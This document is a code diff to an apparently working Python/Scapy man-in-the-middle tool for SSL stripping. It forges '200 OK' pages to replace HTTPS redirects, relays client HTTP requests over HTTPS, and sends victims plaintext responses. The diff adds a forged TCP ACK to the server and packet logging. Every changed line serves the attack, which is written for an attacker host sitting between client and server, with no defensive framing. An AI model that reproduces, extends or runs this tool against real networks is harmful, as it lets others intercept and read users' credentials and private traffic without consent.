@@ -58,7 +58,7 @@ def forwardClient(pkt, src_mac, dst_mac, iface):
 
 # === HTTPS Redirect Stripping ===
 
-def strip_https_redirect(pkt, attackerMac, clientMac, attackerIP, clientIP, iface):
+def strip_https_redirect(pkt, attackerMac, clientMac, attackerIP, clientIP, iface, serverMac, serverIP):
     print("Intercepting and replacing HTTPS redirect with 200 OK")
 
     html = "<html><body><h1>Welcome</h1></body></html>"
@@ -87,6 +87,19 @@ def strip_https_redirect(pkt, attackerMac, clientMac, attackerIP, clientIP, ifac
     del new_pkt[sc.IP].chksum
     del new_pkt[sc.TCP].chksum
     sc.sendp(new_pkt, iface=iface, verbose=False)
+    log_packet("Stripped redirect to client",new_pkt)
+
+    ack_pkt = sc.Ether(src=attackerMac, dst=serverMac) / sc.IP(src=attackerIP, dst=serverIP) / sc.TCP(
+        sport=pkt[sc.TCP].dport,
+        dport=pkt[sc.TCP].sport,
+        seq=pkt[sc.TCP].ack,
+        ack=pkt[sc.TCP].seq + len(pkt[sc.Raw].load) if pkt.haslayer(sc.Raw) else pkt[sc.TCP].seq + 1,
+        flags="A"
+    )
+    del ack_pkt[sc.IP].chksum
+    del ack_pkt[sc.TCP].chksum
+    sc.sendp(ack_pkt, iface=iface, verbose=False)
+    log_packet("ack to server",ack_pkt)
 
 # === Forward HTTP -> HTTPS and convert response to HTTP ===
 
@@ -145,7 +158,7 @@ def forward_http_to_https(pkt, attackerMac, clientMac, attackerIP, clientIP, ser
         del forged_pkt[sc.IP].chksum
         del forged_pkt[sc.TCP].chksum
         sc.sendp(forged_pkt, iface=iface, verbose=False)
-
+        log_packet("Clean HTTP to client", forged_pkt)
     except Exception as e:
         print(f"[!] TLS Termination Error: {e}")
 
@@ -184,12 +197,13 @@ def forwarding(mode, iface, clientIP, attackerIP, clientMac, serverIP, attackerM
 
         if src == clientIP:
             if mode and is_raw(pkt):
+                log_packet("Http request from client", pkt)
                 forward_http_to_https(pkt, attackerMac, clientMac, attackerIP, clientIP, serverIP, iface)
             else:
                 forwardServer(pkt, attackerMac, serverMac, iface)
         elif src == serverIP:
             if mode and is_https_redirect(pkt):
-                strip_https_redirect(pkt, attackerMac, clientMac, attackerIP, clientIP, iface)
+                strip_https_redirect(pkt, attackerMac, clientMac, attackerIP, clientIP, iface, serverMac, serverIP)
             else:
                 forwardClient(pkt, attackerMac, clientMac, iface)
 
